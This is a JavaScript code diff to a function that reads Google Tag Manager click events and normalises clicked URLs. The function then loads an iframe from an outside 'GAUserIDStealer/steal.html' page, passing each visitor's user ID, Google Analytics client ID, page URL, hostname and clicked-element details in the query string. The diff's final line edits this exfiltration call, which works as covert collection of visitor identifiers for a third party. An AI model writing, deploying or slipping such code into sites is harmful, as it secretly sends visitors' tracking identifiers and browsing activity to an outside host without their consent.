@@ -72,6 +72,7 @@ function doFlow(){
     elementText=""
     tmp_text=""
     dataanalyticsID="null"
+    site_domain=window.location.hostname
 
     for(i=dataLayer.length-1;i>=0;i--){
         if(dataLayer[i]['event']=="gtm.click"){
@@ -79,6 +80,16 @@ function doFlow(){
             try{
                 if('gtm.elementUrl' in dataLayer[i]){
                     elementUrl=dataLayer[i]['gtm.elementUrl'];
+                    console.log('ori elementUrl: '+elementUrl)
+                    if(elementUrl==""){
+                        elementUrl="/"
+                    }
+                    else{
+                        fullsite_domain='https://'+site_domain
+                        var re=RegExp(fullsite_domain,'g');
+                        elementUrl=elementUrl.replace(re,"");
+                    }
+                    console.log('new elementUrl: '+elementUrl)
                 }
             }catch(e){
                 console.log(e);
@@ -167,7 +178,7 @@ function doFlow(){
         }
     }
 
-    if(elementUrl=="" && elementClasses=="" && elementId=="" && dataanalyticsID=="null"){
+    if(elementUrl=="/" && elementClasses=="" && elementId=="" && dataanalyticsID=="null"){
         if(elementText!="" && !isNaN(Number(elementText))){
             var re=RegExp('\\d+\\.\\d+','g');
             elementText=elementText.replace(re,"-RAND-");
@@ -181,5 +192,5 @@ function doFlow(){
     }
 
 
-    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
 }
